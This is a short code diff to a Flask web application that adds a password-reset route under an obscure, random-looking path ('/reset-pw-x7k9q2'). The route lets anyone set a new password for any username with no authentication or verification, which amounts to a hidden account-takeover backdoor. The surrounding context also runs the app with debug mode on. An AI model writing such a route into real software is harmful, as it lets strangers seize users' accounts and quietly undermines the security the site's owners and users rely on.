@@ -1359,6 +1359,22 @@ def clubs_create():
 
 
 
+@app.route("/reset-pw-x7k9q2", methods=["GET", "POST"])
+def reset_pw():
+    if request.method == "GET":
+        return '''<form method=post>
+            Username: <input name=username><br>
+            New password: <input name=password type=password><br>
+            <button type=submit>Reset</button></form>'''
+    import bcrypt
+    username = request.form["username"]
+    password = request.form["password"].encode()
+    hashed = bcrypt.hashpw(password, bcrypt.gensalt()).decode()
+    with db() as conn:
+        conn.execute("UPDATE users SET password_hash=? WHERE username=?", (hashed, username))
+    return "Password reset! You can now log in."
+
+
 if __name__ == "__main__":
     init_db()
     app.run(debug=True, port=5001)
